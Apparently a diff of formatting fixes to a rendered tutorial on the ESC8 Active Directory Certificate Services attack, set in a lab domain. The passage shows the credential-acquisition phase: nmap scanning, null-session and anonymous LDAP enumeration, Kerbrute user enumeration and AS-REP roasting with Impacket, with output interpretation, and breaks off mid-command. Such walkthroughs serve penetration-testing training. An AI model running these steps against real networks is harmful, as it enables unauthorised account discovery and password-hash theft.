 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario-5-red-team-exercises">Scenario 5: Red Team Exercises<a href="#scenario-5-red-team-exercises" class="hash-link" aria-label="Direct link to Scenario 5: Red Team Exercises" title="Direct link to Scenario 5: Red Team Exercises" translate="no">​</a></h3>
-<p>**Situation:**Simulating advanced persistent threat (APT) attacks.</p>
+<p><strong>Situation:</strong> Simulating advanced persistent threat (APT) attacks.</p>
 <p><strong>Why ESC8 is Perfect:</strong></p>
 <ul>
 <li class="">
@@ -317,85 +317,85 @@
 <p><strong>Target Environment:</strong></p>
 <ul>
 <li class="">
-<p>**Domain:**sevenkingdoms.local (SEVENKINGDOMS)</p>
+<p><strong>Domain:</strong> sevenkingdoms.local (SEVENKINGDOMS)</p>
 </li>
 <li class="">
-<p>**Domain Controller:**kingslanding.sevenkingdoms.local (192.168.56.10)</p>
+<p><strong>Domain Controller:</strong> kingslanding.sevenkingdoms.local (192.168.56.10)</p>
 </li>
 <li class="">
-<p>**OS:**Windows Server 2019/2022</p>
+<p><strong>OS:</strong> Windows Server 2019/2022</p>
 </li>
 <li class="">
-<p>**ADCS:**Installed and configured with Web Enrollment over HTTP</p>
+<p><strong>ADCS:</strong> Installed and configured with Web Enrollment over HTTP</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="required-tools">Required Tools<a href="#required-tools" class="hash-link" aria-label="Direct link to Required Tools" title="Direct link to Required Tools" translate="no">​</a></h2>
 <ul>
-<li class=""><strong>Certipy</strong>— ADCS enumeration and exploitation</li>
+<li class=""><strong>Certipy</strong> — ADCS enumeration and exploitation</li>
 </ul>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">pip3 install certipy-ad --</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">break</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-system-packages</span><br></div></code></pre></div></div>
-<p><strong>2. Impacket</strong>— NTLM relay and Kerberos authentication</p>
-<p><strong>3. LDAP Tools</strong>— Directory enumeration</p>
-<p><strong>4. Nmap</strong>— Network scanning</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">pip3 install certipy-ad --break-system-packages</span><br></div></code></pre></div></div>
+<p><strong>2. Impacket</strong> — NTLM relay and Kerberos authentication</p>
+<p><strong>3. LDAP Tools</strong> — Directory enumeration</p>
+<p><strong>4. Nmap</strong> — Network scanning</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="initial-access-requirements">Initial Access Requirements<a href="#initial-access-requirements" class="hash-link" aria-label="Direct link to Initial Access Requirements" title="Direct link to Initial Access Requirements" translate="no">​</a></h2>
 <p>For this attack, you need one of the following:</p>
 <ul>
 <li class="">
-<p><strong>Low-privilege domain credentials</strong>(e.g., TestUser<!-- -->:Password123<!-- -->!)</p>
+<p><strong>Low-privilege domain credentials</strong> (e.g., TestUser<!-- -->:Password123<!-- -->!)</p>
 </li>
 <li class="">
-<p><strong>Network access</strong>to trigger authentication from DC</p>
+<p><strong>Network access</strong> to trigger authentication from DC</p>
 </li>
 <li class="">
-<p><strong>Ability to intercept network traffic</strong>(for NTLM relay)</p>
+<p><strong>Ability to intercept network traffic</strong> (for NTLM relay)</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-by-step-attack-guide">Step-by-Step Attack Guide<a href="#step-by-step-attack-guide" class="hash-link" aria-label="Direct link to Step-by-Step Attack Guide" title="Direct link to Step-by-Step Attack Guide" translate="no">​</a></h2>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-0-obtaining-low-privilege-credentials">Phase 0: Obtaining Low-Privilege Credentials<a href="#phase-0-obtaining-low-privilege-credentials" class="hash-link" aria-label="Direct link to Phase 0: Obtaining Low-Privilege Credentials" title="Direct link to Phase 0: Obtaining Low-Privilege Credentials" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="starting-from-ip-address">(Starting from IP Address)<a href="#starting-from-ip-address" class="hash-link" aria-label="Direct link to (Starting from IP Address)" title="Direct link to (Starting from IP Address)" translate="no">​</a></h3>
-<p><strong>Important:<strong>The ESC8 attack requires low-privilege domain credentials. This section explains how to obtain these credentials starting from</strong>just an IP address</strong>with zero prior knowledge.</p>
+<p><strong>Important:</strong> The ESC8 attack requires low-privilege domain credentials. This section explains how to obtain these credentials starting from <strong>just an IP address</strong> with zero prior knowledge.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="overview-the-credential-discovery-process">Overview: The Credential Discovery Process<a href="#overview-the-credential-discovery-process" class="hash-link" aria-label="Direct link to Overview: The Credential Discovery Process" title="Direct link to Overview: The Credential Discovery Process" translate="no">​</a></h3>
 <p>Starting from a single IP address, we need to:</p>
 <ul>
 <li class="">
-<p><strong>Discover</strong>the target is a Domain Controller</p>
+<p><strong>Discover</strong> the target is a Domain Controller</p>
 </li>
 <li class="">
-<p><strong>Enumerate</strong>domain users without credentials</p>
+<p><strong>Enumerate</strong> domain users without credentials</p>
 </li>
 <li class="">
-<p><strong>Obtain</strong>valid credentials through various attack methods</p>
+<p><strong>Obtain</strong> valid credentials through various attack methods</p>
 </li>
 <li class="">
-<p><strong>Verify</strong>credentials work before proceeding to ESC8</p>
+<p><strong>Verify</strong> credentials work before proceeding to ESC8</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-01-initial-reconnaissance--port-scanning">Step 0.1: Initial Reconnaissance — Port Scanning<a href="#step-01-initial-reconnaissance--port-scanning" class="hash-link" aria-label="Direct link to Step 0.1: Initial Reconnaissance — Port Scanning" title="Direct link to Step 0.1: Initial Reconnaissance — Port Scanning" translate="no">​</a></h3>
-<p>**Objective:**Identify if the target is a Domain Controller and what services are running.</p>
+<p><strong>Objective:</strong> Identify if the target is a Domain Controller and what services are running.</p>
 <p><strong>Command:</strong></p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Comprehensive port scan</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -sC -p 53,88,135,139,389,445,636,3268,3269,5985,5986 192.168.56.10</span><br></div></code></pre></div></div>
 <p><strong>What to Look For:</strong></p>
 <ul>
 <li class="">
-<p><strong>Port 53</strong>— DNS (confirms AD presence)</p>
+<p><strong>Port 53</strong> — DNS (confirms AD presence)</p>
 </li>
 <li class="">
-<p><strong>Port 88</strong>— Kerberos (confirms AD presence)</p>
+<p><strong>Port 88</strong> — Kerberos (confirms AD presence)</p>
 </li>
 <li class="">
-<p><strong>Port 389</strong>— LDAP (confirms AD presence)</p>
+<p><strong>Port 389</strong> — LDAP (confirms AD presence)</p>
 </li>
 <li class="">
-<p><strong>Port 445</strong>— SMB (allows enumeration)</p>
+<p><strong>Port 445</strong> — SMB (allows enumeration)</p>
 </li>
 <li class="">
-<p><strong>Port 636</strong>— LDAPS (LDAP over SSL)</p>
+<p><strong>Port 636</strong> — LDAPS (LDAP over SSL)</p>
 </li>
 <li class="">
-<p><strong>Port 135</strong>— RPC Endpoint Mapper</p>
+<p><strong>Port 135</strong> — RPC Endpoint Mapper</p>
 </li>
 <li class="">
-<p><strong>Port 5985/5986</strong>— WinRM (may allow enumeration)</p>
+<p><strong>Port 5985/5986</strong> — WinRM (may allow enumeration)</p>
 </li>
 </ul>
 <p><strong>Expected Output:</strong></p>
@@ -414,44 +414,44 @@
 </ul>
 <p><strong>This is a Domain Controller</strong></p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-02-discover-domain-name">Step 0.2: Discover Domain Name<a href="#step-02-discover-domain-name" class="hash-link" aria-label="Direct link to Step 0.2: Discover Domain Name" title="Direct link to Step 0.2: Discover Domain Name" translate="no">​</a></h3>
-<p>**Objective:**Identify the domain name without credentials.</p>
+<p><strong>Objective:</strong> Identify the domain name without credentials.</p>
 <p><strong>Method 1: SMB Null Session Enumeration</strong></p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Try null session enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">smbclient -L </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//192.168.56.10 -N</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Try null session enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">smbclient -L //192.168.56.10 -N</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*Ibp3xeZP4czrrroEc4jZ4g.png" alt="Article image" width="990" height="138" loading="lazy" decoding="async">
 <p><strong>Method 2: RPC Null Session</strong></p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Query domain information via RPC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -N 192.168.56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Then in rpcclient prompt:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; enumdomusers</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; querydominfo</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">exit</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Query domain information via RPC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U &quot;&quot; -N 192.168.56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Then in rpcclient prompt:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; enumdomusers</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; querydominfo</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; exit</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*X8KN1HUHLElLwDdyP_w0sA.png" alt="Article image" width="465" height="281" loading="lazy" decoding="async">
 <p><strong>Method 3: LDAP Anonymous Bind</strong></p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Try anonymous LDAP bind</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H ldap:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//192.168.56.10 -s base namingContexts</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Try anonymous LDAP bind</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H ldap://192.168.56.10 -s base namingContexts</span><br></div></code></pre></div></div>
 <p><strong>Expected Output:</strong></p>
 <img src="https://cdn-images-1.medium.com/max/800/1*iASnWIfXL2AKVKQqFOK_fA.png" alt="Article image" width="1137" height="519" loading="lazy" decoding="async">
 <p><strong>Analysis:</strong></p>
 <ul>
 <li class="">
-<p>✅ Domain discovered:<strong>sevenkingdoms.local</strong></p>
+<p>✅ Domain discovered: <strong>sevenkingdoms.local</strong></p>
 </li>
 <li class="">
 <p>✅ Ready for user enumeration</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-03-enumerate-domain-users-without-credentials">Step 0.3: Enumerate Domain Users (Without Credentials)<a href="#step-03-enumerate-domain-users-without-credentials" class="hash-link" aria-label="Direct link to Step 0.3: Enumerate Domain Users (Without Credentials)" title="Direct link to Step 0.3: Enumerate Domain Users (Without Credentials)" translate="no">​</a></h3>
-<p>**Objective:**Discover all domain users for password attacks.</p>
+<p><strong>Objective:</strong> Discover all domain users for password attacks.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="user-enumeration-techniques">User Enumeration Techniques<a href="#user-enumeration-techniques" class="hash-link" aria-label="Direct link to User Enumeration Techniques" title="Direct link to User Enumeration Techniques" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="technique-1-kerberos-user-enumeration-kerbrute">Technique 1: Kerberos User Enumeration (Kerbrute)<a href="#technique-1-kerberos-user-enumeration-kerbrute" class="hash-link" aria-label="Direct link to Technique 1: Kerberos User Enumeration (Kerbrute)" title="Direct link to Technique 1: Kerberos User Enumeration (Kerbrute)" translate="no">​</a></h3>
-<p>**Tool:**Kerbrute</p>
-<p>**Method:**Kerberos pre-authentication can reveal whether a username exists without requiring a password. When a valid username is provided, the response differs from an invalid username.</p>
+<p><strong>Tool:</strong> Kerbrute</p>
+<p><strong>Method:</strong> Kerberos pre-authentication can reveal whether a username exists without requiring a password. When a valid username is provided, the response differs from an invalid username.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">kerbrute userenum </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--dc</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -d sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> userlist</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.txt</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local userlist.txt</span><br></div></code></pre></div></div>
 <p><strong>How It Works:</strong></p>
 <ul>
 <li class="">
-<p>Valid usernames return<code>KDC_ERR_PREAUTH_REQUIRED</code>(username exists, password required)</p>
+<p>Valid usernames return <code>KDC_ERR_PREAUTH_REQUIRED</code> (username exists, password required)</p>
 </li>
 <li class="">
-<p>Invalid usernames return<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>(username doesn&#x27;t exist)</p>
+<p>Invalid usernames return <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (username doesn&#x27;t exist)</p>
 </li>
 <li class="">
 <p>This allows enumeration without triggering account lockouts</p>
@@ -475,12 +475,12 @@
 <p>Press enter or click to view image in full size</p>
 <img src="https://cdn-images-1.medium.com/max/800/0*mdOn25OpN8Su2XYq.png" alt="Article image" width="700" height="218" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="technique-2-smb-user-enumeration">Technique 2: SMB User Enumeration<a href="#technique-2-smb-user-enumeration" class="hash-link" aria-label="Direct link to Technique 2: SMB User Enumeration" title="Direct link to Technique 2: SMB User Enumeration" translate="no">​</a></h3>
-<p>**Tool:**Enum4linux, RPCClient</p>
-<p>**Method:**Attempting to enumerate users via SMB/RPC protocols.</p>
+<p><strong>Tool:</strong> Enum4linux, RPCClient</p>
+<p><strong>Method:</strong> Attempting to enumerate users via SMB/RPC protocols.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">enum4linux -U </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">enum4linux -U 192.168.56.10</span><br></div></code></pre></div></div>
 <p><strong>Alternative with RPCClient:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -N 192.168.56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; enumdomusers</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">rpcclient -U &quot;&quot; -N 192.168.56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt; enumdomusers</span><br></div></code></pre></div></div>
 <p><strong>Limitations:</strong></p>
 <ul>
 <li class="">
@@ -494,63 +494,63 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="technique-3-ldap-user-enumeration-anonymous">Technique 3: LDAP User Enumeration (Anonymous)<a href="#technique-3-ldap-user-enumeration-anonymous" class="hash-link" aria-label="Direct link to Technique 3: LDAP User Enumeration (Anonymous)" title="Direct link to Technique 3: LDAP User Enumeration (Anonymous)" translate="no">​</a></h3>
-<p>**Tool:**ldapsearch</p>
-<p>**Method:**Attempting anonymous LDAP queries to enumerate users.</p>
+<p><strong>Tool:</strong> ldapsearch</p>
+<p><strong>Method:</strong> Attempting anonymous LDAP queries to enumerate users.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;ldap://192.168.56.10&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;DC=sevenkingdoms,DC=local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;(objectClass=user)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> sAMAccountName</span><br></div></code></pre></div></div>
-<p>**Result:**Typically fails in properly configured AD environments (authentication required)</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H &quot;ldap://192.168.56.10&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b &quot;DC=sevenkingdoms,DC=local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;(objectClass=user)&quot; sAMAccountName</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> Typically fails in properly configured AD environments (authentication required)</p>
 <p>Press enter or click to view image in full size</p>
 <img src="https://cdn-images-1.medium.com/max/800/0*lTvQltO0MnbM2UzU.png" alt="Article image" width="700" height="218" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="technique-4-as-rep-roasting-for-user-discovery">Technique 4: AS-REP Roasting for User Discovery<a href="#technique-4-as-rep-roasting-for-user-discovery" class="hash-link" aria-label="Direct link to Technique 4: AS-REP Roasting for User Discovery" title="Direct link to Technique 4: AS-REP Roasting for User Discovery" translate="no">​</a></h3>
-<p>**Tool:**Impacket GetNPUsers</p>
-<p>**Method:**AS-REP Roasting can reveal usernames of accounts with pre-authentication disabled.</p>
+<p><strong>Tool:</strong> Impacket GetNPUsers</p>
+<p><strong>Method:</strong> AS-REP Roasting can reveal usernames of accounts with pre-authentication disabled.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">GetNPUsers.py sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/ \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -usersfile userlist.txt \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">format</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> hashcat</span><br></div></code></pre></div></div>
-<p>**Benefit:**Discovers both valid usernames AND vulnerable accounts simultaneously.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">GetNPUsers.py sevenkingdoms.local/ \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -usersfile userlist.txt \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -format hashcat</span><br></div></code></pre></div></div>
+<p><strong>Benefit:</strong> Discovers both valid usernames AND vulnerable accounts simultaneously.</p>
 <p>Press enter or click to view image in full size</p>
 <img src="https://cdn-images-1.medium.com/max/800/0*1cOKo6-tK0PMi-2-.png" alt="Article image" width="700" height="242" loading="lazy" decoding="async">
 <p>Your run is successful. The important line is this one:</p>
 <p><code>$krb5asrep$23$TestUser@SEVENKINGDOMS.LOCAL:...</code></p>
-<p>That means<strong>AS-REP Roasting worked for</strong><code>**TestUser**</code>(the account is configured with**“Do not require Kerberos pre-authentication”<strong>), and Impacket returned an AS-REP hash in</strong>hashcat format**.</p>
-<p>Everything else in the output is just per-user status from your<code>userlist.txt</code>:</p>
+<p>That means <strong>AS-REP Roasting worked for</strong> <code>**TestUser**</code> (the account is configured with <strong>“Do not require Kerberos pre-authentication”</strong>), and Impacket returned an AS-REP hash in <strong>hashcat format</strong>.</p>
+<p>Everything else in the output is just per-user status from your <code>userlist.txt</code>:</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-the-messages-mean">What the messages mean<a href="#what-the-messages-mean" class="hash-link" aria-label="Direct link to What the messages mean" title="Direct link to What the messages mean" translate="no">​</a></h3>
 <ul>
 <li class="">
 <p><code>User &amp;lt;X&amp;gt; doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</code>
-The user<strong>requires pre-auth</strong>, so<strong>not AS-REP roastable</strong>(nothing to extract).</p>
+The user <strong>requires pre-auth</strong>, so <strong>not AS-REP roastable</strong> (nothing to extract).</p>
 </li>
 <li class="">
 <p><code>KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)</code>
-That username<strong>does not exist</strong>in the domain (typo / wrong list / wrong realm).</p>
+That username <strong>does not exist</strong> in the domain (typo / wrong list / wrong realm).</p>
 </li>
 <li class="">
 <p><code>KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)</code>
-The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</p>
+The account is <strong>disabled / locked / revoked</strong>, so KDC refuses it.</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="next-practical-steps">Next practical steps<a href="#next-practical-steps" class="hash-link" aria-label="Direct link to Next practical steps" title="Direct link to Next practical steps" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-save-only-the-hashes-to-a-file-clean-output">1) Save only the hashes to a file (clean output)<a href="#1-save-only-the-hashes-to-a-file-clean-output" class="hash-link" aria-label="Direct link to 1) Save only the hashes to a file (clean output)" title="Direct link to 1) Save only the hashes to a file (clean output)" translate="no">​</a></h3>
 <p>Run again and write results to a file:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">GetNPUsers.py sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/ \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -usersfile userlist.txt \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">format</span><br></div><div class="token-line" style="color:#393A34"><span 